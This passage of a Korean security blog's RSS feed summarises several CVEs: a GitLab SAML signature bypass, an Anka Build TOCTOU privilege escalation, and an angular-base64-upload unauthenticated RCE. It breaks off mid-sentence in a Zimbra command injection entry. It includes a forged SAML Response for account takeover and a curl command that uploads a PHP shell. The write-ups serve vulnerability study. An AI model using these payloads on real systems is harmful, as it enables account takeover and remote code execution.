&#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD2B8;&#xB9AC;&#xAC70;&#xC5D0;&#xB294; &#xC544;&#xBB34; &#xC694;&#xC18C;&#xB098; &#xBC30;&#xCE58;&#xB420; &#xC218; &#xC788;&#xB294; samlp:extensions &#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB294; Assertion &#xC758; digest &#xB97C; samlp:extension &#xB85C; &#xAC10;&#xC2F8;&#xC11C; SignedInfo &#xC55E; &#xCABD;&#xC5D0; &#xBC30;&#xCE58;&#xD558;&#xC5EC; &#xAC80;&#xC99D;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xC124;&#xBA85;&#xC5D0; &#xB530;&#xB978; &#xBCC0;&#xC870;&#xB41C; SAML Response &#xC608;&#xC2DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;&lt;samlp:Response Destination=<span class="hljs-string">&quot;http://kubernetes.docker.internal:3000/saml/acs&quot;</span>    ID=<span class="hljs-string">&quot;_afe0ff5379c42c67e0fb&quot;</span> InResponseTo=<span class="hljs-string">&quot;_f55b2958-2c8d-438b-a3fe-e84178b8d4fc&quot;</span>    IssueInstant=<span class="hljs-string">&quot;2024-10-03T13:50:44.973Z&quot;</span> Version=<span class="hljs-string">&quot;2.0&quot;</span>    xmlns:samlp=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot;</span> xmlns:xs=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>&gt;    &lt;saml:Issuer Format=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:nameid-format:entity&quot;</span>        xmlns:saml=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span>&gt;https:<span class="hljs-comment">//saml.example.com/entityid&lt;/saml:Issuer&gt;</span>    &lt;samlp:Extensions&gt;        &lt;DigestValue xmlns=<span class="hljs-string">&quot;http://www.w3.org/2000/09/xmldsig#&quot;</span>&gt;            &#xBCC0;&#xC870;&#xB41C; assertion contents &#xC758; digset        &lt;/DigestValue&gt;    &lt;/samlp:Extensions&gt;    &lt;samlp:Status xmlns:samlp=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot;</span>&gt;        &lt;samlp:StatusCode Value=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:status:Success&quot;</span> /&gt;    &lt;/samlp:Status&gt;    &lt;saml:Assertion ID=<span class="hljs-string">&quot;_911d8da24301c447b649&quot;</span> IssueInstant=<span class="hljs-string">&quot;2024-10-03T13:50:44.973Z&quot;</span> Version=<span class="hljs-string">&quot;2.0&quot;</span>        xmlns:saml=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span>        xmlns:xs=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>&gt;        &lt;saml:Issuer Format=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:nameid-format:entity&quot;</span>            xmlns:saml=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span>&gt;https:<span class="hljs-comment">//saml.example.com/entityid&lt;/saml:Issuer&gt;</span>        &lt;Signature xmlns=<span class="hljs-string">&quot;http://www.w3.org/2000/09/xmldsig#&quot;</span>&gt;            &lt;SignedInfo&gt;                &lt;CanonicalizationMethod Algorithm=<span class="hljs-string">&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;</span> /&gt;                &lt;SignatureMethod Algorithm=<span class="hljs-string">&quot;http://www.w3.org/2001/04/xmldsig-more#rsa-sha256&quot;</span> /&gt;                &lt;Reference URI=<span class="hljs-string">&quot;#_911d8da24301c447b649&quot;</span>&gt;                    &lt;Transforms&gt;                        &lt;Transform Algorithm=<span class="hljs-string">&quot;http://www.w3.org/2000/09/xmldsig#enveloped-signature&quot;</span> /&gt;                        &lt;Transform Algorithm=<span class="hljs-string">&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;</span> /&gt;                    &lt;/Transforms&gt;                    &lt;DigestMethod Algorithm=<span class="hljs-string">&quot;http://www.w3.org/2001/04/xmlenc#sha256&quot;</span> /&gt;                    &lt;DigestValue&gt;&#xC6D0;&#xBCF8; assertion &#xC758; digest&lt;/DigestValue&gt;                &lt;/Reference&gt;            &lt;/SignedInfo&gt;            &lt;SignatureValue&gt;            &#xC6D0;&#xBCF8; digest &#xC758; &#xC11C;&#xBA85;            &lt;/SignatureValue&gt;            &lt;KeyInfo&gt;                &lt;X509Data&gt;                    &lt;X509Certificate&gt;&#xC11C;&#xBA85; &#xC9C4;&#xD589;&#xD55C; &#xC778;&#xC99D;&#xC11C;&lt;/X509Certificate&gt;                &lt;/X509Data&gt;            &lt;/KeyInfo&gt;        &lt;/Signature&gt;        &lt;saml:Subject xmlns:saml=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span>&gt;            &lt;saml:NameID Format=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress&quot;</span>&gt;                &#xB85C;&#xADF8;&#xC778;&#xD560; gitlab &#xACC4;&#xC815;            &lt;/saml:NameID&gt;            &lt;saml:SubjectConfirmation Method=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&quot;</span>&gt;                &lt;saml:SubjectConfirmationData InResponseTo=<span class="hljs-string">&quot;_f55b2958-2c8d-438b-a3fe-e84178b8d4fc&quot;</span>                    NotOnOrAfter=<span class="hljs-string">&quot;2024-10-03T13:55:44.973Z&quot;</span>                    Recipient=<span class="hljs-string">&quot;http://kubernetes.docker.internal:3000/saml/acs&quot;</span> /&gt;            &lt;/saml:SubjectConfirmation&gt;        &lt;/saml:Subject&gt;        &lt;saml:Conditions NotBefore=<span class="hljs-string">&quot;2024-10-03T13:45:44.973Z&quot;</span>            NotOnOrAfter=<span class="hljs-string">&quot;2024-10-03T13:55:44.973Z&quot;</span>            xmlns:saml=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span>&gt;            &lt;saml:AudienceRestriction&gt;                &lt;saml:Audience&gt;https:<span class="hljs-comment">//saml.example.com/entityid&lt;/saml:Audience&gt;</span>            &lt;/saml:AudienceRestriction&gt;        &lt;/saml:Conditions&gt;        &lt;saml:AuthnStatement AuthnInstant=<span class="hljs-string">&quot;2024-10-03T13:50:44.973Z&quot;</span>            SessionIndex=<span class="hljs-string">&quot;_f55b2958-2c8d-438b-a3fe-e84178b8d4fc&quot;</span>            xmlns:saml=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span>&gt;            &lt;saml:AuthnContext&gt;                &lt;saml:AuthnContextClassRef&gt;                    urn:oasis:names:tc:SAML:<span class="hljs-number">2.0</span>:ac:classes:PasswordProtectedTransport                &lt;/saml:AuthnContextClassRef&gt;            &lt;/saml:AuthnContext&gt;        &lt;/saml:AuthnStatement&gt;        &lt;saml:AttributeStatement xmlns:saml=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span>&gt;            &lt;saml:Attribute Name=<span class="hljs-string">&quot;id&quot;</span>                NameFormat=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:unspecified&quot;</span>&gt;                &lt;saml:AttributeValue xmlns:xs=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>                    xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> xsi:type=<span class="hljs-string">&quot;xs:string&quot;</span>&gt;                    <span class="hljs-number">1</span>dda9fb491dc01bd24d2423ba2f22ae561f56ddf2376b29a11c80281d21201f9                &lt;/saml:AttributeValue&gt;            &lt;/saml:Attribute&gt;            &lt;saml:Attribute Name=<span class="hljs-string">&quot;email&quot;</span>                NameFormat=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:unspecified&quot;</span>&gt;                &lt;saml:AttributeValue xmlns:xs=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>                    xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> xsi:type=<span class="hljs-string">&quot;xs:string&quot;</span>&gt;                    jackson@example.com                &lt;/saml:AttributeValue&gt;            &lt;/saml:Attribute&gt;        &lt;/saml:AttributeStatement&gt;    &lt;/saml:Assertion&gt;&lt;/samlp:Response&gt;</code></pre><p>&#xC704; &#xCC98;&#xB7FC; SAML Response &#xAC00; &#xAD6C;&#xC131;&#xB41C;&#xB2E4;&#xBA74;, SignedInfo &#xB294; &#xBCC0;&#xACBD;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC73C;&#xB2C8; &#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC774; &#xD1B5;&#xACFC;&#xB418;&#xBA70;, &#xBCC0;&#xC870;&#xB41C; Assertion &#xC758; DigestValue&#xB294; <samlp:extension> &#xC5D0; &#xBC30;&#xCE58;&#xB418;&#xAE30;&#xC5D0; hash &#xAC80;&#xC0AC;&#xAC00; &#xD1B5;&#xACFC;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC784;&#xC758; &#xACC4;&#xC815;&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xAC8C;&#xB429;&#xB2C8;&#xB2E4;.</samlp:extension></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/synacktiv/CVE-2024-45409">https://github.com/synacktiv/CVE-2024-45409</a></li><li><a href="https://about.gitlab.com/releases/2024/09/17/patch-release-gitlab-17-3-3-released/?ref=blog.projectdiscovery.io">https://about.gitlab.com/releases/2024/09/17/patch-release-gitlab-17-3-3-released/?ref=blog.projectdiscovery.io</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45409">https://nvd.nist.gov/vuln/detail/CVE-2024-45409</a></li><li><a href="https://github.com/omniauth/omniauth-saml/security/advisories/GHSA-cvp8-5r8g-fhvq">https://github.com/omniauth/omniauth-saml/security/advisories/GHSA-cvp8-5r8g-fhvq</a></li><li><a href="https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-jw9c-mfg7-9rx2">https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-jw9c-mfg7-9rx2</a></li><li><a href="https://github.com/SAML-Toolkits/ruby-saml/commit/1ec5392bc506fe43a02dbb66b68741051c5ffeae">https://github.com/SAML-Toolkits/ruby-saml/commit/1ec5392bc506fe43a02dbb66b68741051c5ffeae</a></li><li><a href="https://github.com/SAML-Toolkits/ruby-saml/commit/4865d030cae9705ee5cdb12415c654c634093ae7">https://github.com/SAML-Toolkits/ruby-saml/commit/4865d030cae9705ee5cdb12415c654c634093ae7</a></li><li><a href="https://www.cloudflare.com/ko-kr/learning/access-management/what-is-saml/">https://www.cloudflare.com/ko-kr/learning/access-management/what-is-saml/</a></li><li><a href="https://www.okta.com/kr/blog/2020/09/what-is-saml/">https://www.okta.com/kr/blog/2020/09/what-is-saml/</a></li><li><a href="https://www.w3schools.com/xml/xpath_syntax.asp">https://www.w3schools.com/xml/xpath_syntax.asp</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/mungsul/">mungsul</category>
      
      <category domain="https://hackyboiz.github.io/tags/gitlab/">gitlab</category>
      
      <category domain="https://hackyboiz.github.io/tags/account-takeover/">account takeover</category>
      
      <category domain="https://hackyboiz.github.io/tags/SAML/">SAML</category>
      
      
      <comments>https://hackyboiz.github.io/2024/10/19/mungsul/2024-10-19/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-39755: Anka Build의 TOCTOU로 인한 권한 상승 취약점</title>
      <link>https://hackyboiz.github.io/2024/10/16/ogu123/cve-2024-39755/</link>
      <guid>https://hackyboiz.github.io/2024/10/16/ogu123/cve-2024-39755/</guid>
      <pubDate>Wed, 16 Oct 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://talosintelligence.com/vulnerability_reports</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2024-2060">https://talosintelligence.com/vulnerability_reports/TALOS-2024-2060</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Anka Build &lt; 1.43.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Anka Build&#xB294; macOS &#xAC00;&#xC0C1;&#xD654;&#xB97C; &#xC704;&#xD55C; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xB3C4;&#xAD6C;&#xB85C; Controller, Registry, Nodes &#xC138; &#xAC00;&#xC9C0;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC838;, macOS &#xBC0F; iOS &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; CI/CD &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xD560; &#xBAA9;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xACC4;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; Anka Build Node&#xAC00; Controller&#xC5D0; &#xC5F0;&#xACB0;&#xB418;&#xAC70;&#xB098; &#xC774;&#xBBF8; &#xC5F0;&#xACB0;&#xB41C; Node&#xC5D0;&#xC11C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB420; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs smali">pkg_path.ptr = (char *)&amp;tmp_anka_agent_pkg_path;  //  &lt;------- (1) pkg_path.len = 18<span class="hljs-class">LL;</span> v26 = veertu_com_veertu_ankaCloud_agent_listener__ptr_AgentListener_downloadFile(         v47,         v50,         pkg_path,         ControllerClient);  //  &lt;------- (2) data = v26.data; tab = v26.tab; [...]    v28 = veertu_com_veertu_ankaCloud_agent_listener__ptr_AgentListener_installPKG(v47, v51); //  &lt;------- (3)  <span class="hljs-built_in"> if </span>( v28.tab )</code></pre><p>Node&#xAC00; Controller&#xC5D0; &#xC5F0;&#xACB0; &#xB610;&#xB294; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB420; &#xB54C; ankaAgent.pkg &#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xD6C4; Node&#xC5D0; &#xC124;&#xCE58;&#xD569;&#xB2C8;&#xB2E4;.<br>(1)&#xBC88;&#xC5D0;&#xC11C; ankaAgent.pkg &#xD30C;&#xC77C;&#xC774; &#xC800;&#xC7A5;&#xB420; &#xC704;&#xCE58; <code>/tmp</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xACE0; (2), (3)&#xBC88;&#xC744; &#xD1B5;&#xD574; pkg &#xD30C;&#xC77C;&#xC758; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xBC0F; &#xC124;&#xCE58;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache">   <span class="hljs-attribute">v41</span> = &amp;unk_<span class="hljs-number">1006</span>B<span class="hljs-number">0</span>EAB;<span class="hljs-attribute">v42</span>[<span class="hljs-number">0</span>] = <span class="hljs-number">4</span>LL;<span class="hljs-attribute">v42</span>[<span class="hljs-number">1</span>] = (__int<span class="hljs-number">64</span>)v<span class="hljs-number">44</span>;<span class="hljs-attribute">v42</span>[<span class="hljs-number">2</span>] = v<span class="hljs-number">46</span>;<span class="hljs-attribute">v42</span>[<span class="hljs-number">3</span>] = (__int<span class="hljs-number">64</span>)&amp;unk_<span class="hljs-number">1006</span>B<span class="hljs-number">3781</span>;<span class="hljs-attribute">v42</span>[<span class="hljs-number">4</span>] = <span class="hljs-number">7</span>LL;<span class="hljs-attribute">v42</span>[<span class="hljs-number">5</span>] = (__int<span class="hljs-number">64</span>)&amp;syscall__stmp_<span class="hljs-number">42</span>;<span class="hljs-attribute">v42</span>[<span class="hljs-number">6</span>] = <span class="hljs-number">1</span>LL;<span class="hljs-attribute">v38</span> = (_ptr_exec_Cmd)os_exec_Command(&amp;unk_<span class="hljs-number">1006</span>B<span class="hljs-number">6153</span>, <span class="hljs-number">9</span>LL, &amp;v<span class="hljs-number">41</span>, <span class="hljs-number">4</span>LL);// &lt;-------- (<span class="hljs-number">4</span>)<span class="hljs-attribute">v15</span> = (syscall_SysProcAttr *)runtime_newobject(&amp;type_cLmOVQFt);<span class="hljs-attribute">v15</span>-&gt;Setpgid = <span class="hljs-number">1</span>;</code></pre><p>(3)&#xBC88; <code>installPKG</code> &#xD568;&#xC218; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; (4)&#xBC88; <code>os_exec_Command</code>&#xB97C; &#xC2E4;&#xD589;&#xB418;&#xBA70; &#xD328;&#xD0A4;&#xC9C0; &#xC124;&#xCE58;&#xAC00; &#xC644;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C; <code>/tmp</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB294; &#xBAA8;&#xB4E0; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, TOCTOU &#xACF5;&#xACA9; &#xAE30;&#xBC95;&#xC744; &#xD1B5;&#xD574; &#xACF5;&#xC2DD; <code>ankaAgent.pkg</code> &#xD30C;&#xC77C;&#xC774; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xB41C; &#xD6C4; &#xC124;&#xCE58;&#xB418;&#xAE30; &#xC804;&#xC758; &#xC9E7;&#xC740; &#xC2DC;&#xAC04; &#xB3D9;&#xC548; &#xC545;&#xC131; &#xD30C;&#xC77C;&#xB85C; &#xAD50;&#xCCB4;&#xD558;&#xC5EC; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC744; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/Anka-Build/">Anka Build</category>
      
      <category domain="https://hackyboiz.github.io/tags/EOP/">EOP</category>
      
      
      <comments>https://hackyboiz.github.io/2024/10/16/ogu123/cve-2024-39755/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-42640 : Angular의 업로드 파일 검증 미흡으로 인한 Unauthenticated RCE</title>
      <link>https://hackyboiz.github.io/2024/10/13/j0ker/2024-10-13/</link>
      <guid>https://hackyboiz.github.io/2024/10/13/j0ker/2024-10-13/</guid>
      <pubDate>Sun, 13 Oct 2024 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.zyenra.com/blog/unauthenticated-rce-in-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.zyenra.com/blog/unauthenticated-rce-in-angular-base64-upload.html">Unauthenticated RCE via Angular-Base64-Upload CVE-2024-42640</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>angular-base64-upload &lt; v0.1.21</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><a href="https://github.com/adonespitogo/angular-base64-upload">angular-base64-upload</a>&#xC740; base64&#xB85C; &#xC778;&#xCF54;&#xB529;&#xB41C; &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD558;&#xB294; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xC785;&#xB2C8;&#xB2E4;.  CVE-2024-42620 &#xCDE8;&#xC57D;&#xC810;&#xC740; angular-base64-upload/demo/server.php &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xBA70; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC6D0;&#xACA9; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC784;&#xC758;&#xC758; &#xD30C;&#xC77C;&#xC744;&#xC5C5;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810; &#xC785;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Base64File</span></span><span class="hljs-class">    </span>{      <span class="hljs-keyword">public</span> $base64 = <span class="hljs-string">&apos;&apos;</span>;      <span class="hljs-keyword">public</span> $filename = <span class="hljs-string">&apos;&apos;</span>;      <span class="hljs-keyword">private</span> $folder = <span class="hljs-string">&apos;uploads&apos;</span>;          <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$attrs</span>)</span><span class="hljs-function">      </span>{        <span class="hljs-keyword">$this</span>-&gt;base64 = $attrs[<span class="hljs-string">&apos;base64&apos;</span>];        <span class="hljs-keyword">$this</span>-&gt;filename = <span class="hljs-keyword">$this</span>-&gt;folder.<span class="hljs-string">&apos;/&apos;</span>.$attrs[<span class="hljs-string">&apos;filename&apos;</span>];        <span class="hljs-keyword">$this</span>-&gt;decodeBase64File();        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>;      }          <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decodeBase64File</span>(<span class="hljs-params"></span>) </span>{          $ifp = fopen(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-string">&apos;w&apos;</span>);          fwrite( $ifp, base64_decode( <span class="hljs-keyword">$this</span>-&gt;base64) );          fclose($ifp);          <span class="hljs-keyword">return</span> $ifp;      }        }    <span class="hljs-comment">//parse request payload</span>    $postdata = file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);    $request = json_decode($postdata, <span class="hljs-literal">true</span>);    <span class="hljs-comment">//end parse</span>      $file = <span class="hljs-keyword">new</span> Base64File($request);    <span class="hljs-keyword">echo</span> $file-&gt;filename;  <span class="hljs-meta">?&gt;</span></code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB294; &#xC778;&#xCF54;&#xB529;&#xB41C; &#xD30C;&#xC77C;&#xC744; &#xBC1B;&#xC544; &#xC5B4;&#xB5A0;&#xD55C; &#xAC80;&#xC99D;&#xB3C4; &#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xD30C;&#xC77C;&#xC744; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xB530;&#xB77C;&#xC11C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC778;&#xCF54;&#xB529;&#xB41C; &#xD30C;&#xC77C;&#xC744; &#xC778;&#xC790;&#xB85C; &#xC11C;&#xBC84;&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC; &#xD55C; &#xD6C4;, uploads &#xD3F4;&#xB354; &#xB0B4; &#xC800;&#xC7A5;&#xB41C; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xBA74; &#xC784;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">curl -lk -X POST \     -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \     -d <span class="hljs-string">&apos;{&quot;base64&quot;: &quot;&lt;base64-content&gt;&quot;, &quot;filename&quot;: &quot;shell.php&quot;}&apos;</span> \     <span class="hljs-string">&quot;http://<span class="hljs-variable">$domain</span>/{node_modules/bower_components}/angular-base64-upload/demo/server.php&quot;</span></code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/Angular/">Angular</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-42640/">CVE-2024-42640</category>
      
      <category domain="https://hackyboiz.github.io/tags/File-Upload/">File Upload</category>
      
      <category domain="https://hackyboiz.github.io/tags/Unauthenticated/">Unauthenticated</category>
      
      
      <comments>https://hackyboiz.github.io/2024/10/13/j0ker/2024-10-13/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-45519: Zimbra의 Command Injection 취약점</title>
      <link>https://hackyboiz.github.io/2024/10/09/pwndorei/2024-10-09/</link>
      <guid>https://hackyboiz.github.io/2024/10/09/pwndorei/2024-10-09/</guid>
      <pubDate>Wed, 09 Oct 2024 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Title&quot;&gt;&lt;a href=&quot;#Title&quot; class=&quot;headerlink&quot; title=&quot;Title&quot;&gt;&lt;/a&gt;Title&lt;/h2&gt;&lt;p&gt;CVE-2024-45519: Zimbra&amp;#xC758; Command Injection &amp;#xCDE8;&amp;</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Title"><a href="#Title" class="headerlink" title="Title"></a>Title</h2><p>CVE-2024-45519: Zimbra&#xC758; Command Injection &#xCDE8;&#xC57D;&#xC810;</p><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.projectdiscovery.io/zimbra-remote-code-execution/">https://blog.projectdiscovery.io/zimbra-remote-code-execution/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><strong>Joule</strong>: version 8.8.15</li><li><strong>Kepler</strong>: version 9.0.0</li><li><strong>Daffodil &lt; v10.1.1</strong></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC774;&#xBA54;&#xC77C; &#xBC0F; &#xD611;&#xC5C5; &#xD50C;&#xB7AB;&#xD3FC;&#xC778; Zimbra&#xC5D0;&#xB294; SMTP&#xB97C; &#xD1B5;&#xD55C; &#xC774;&#xBA54;&#xC77C; &#xC804;&#xC1A1;&#xC744; &#xD578;&#xB4E4;&#xB9C1;&#xD558;&#xB294; postjournal service&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xB370; &#xC5EC;&#xAE30;&#xC11C; &#xC785;&#xB825;&#xAC12;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC544; command injection &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD55C; &#xD568;&#xC218;&#xB294; SMTP &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xD578;&#xB4E4;&#xB9C1;&#xD558;&#xB294; <code>read_maps</code> &#xD568;&#xC218;&#xB85C; <code>popen</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC785;&#xB825;&#xAC12;&#xC774; &#xADF8;&#xB300;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xBA74;&#xC11C; command injection&#xC774; &#xAC00;&#xB2A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/10/09/pwndorei/2024-10-09/image.png" alt="image.png"></p><p><code>read_maps</code> &#xB294; &#xC704;&#xCC98;&#xB7FC; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC785;&#xB825;&#xC744; &#xD30C;&#xC2F1;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xBA85;&#xB839;&#xC904; &#xC778;&#xC790;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; <code>popen</code>&#xD638;&#xCD9C;(56&#xBC88; 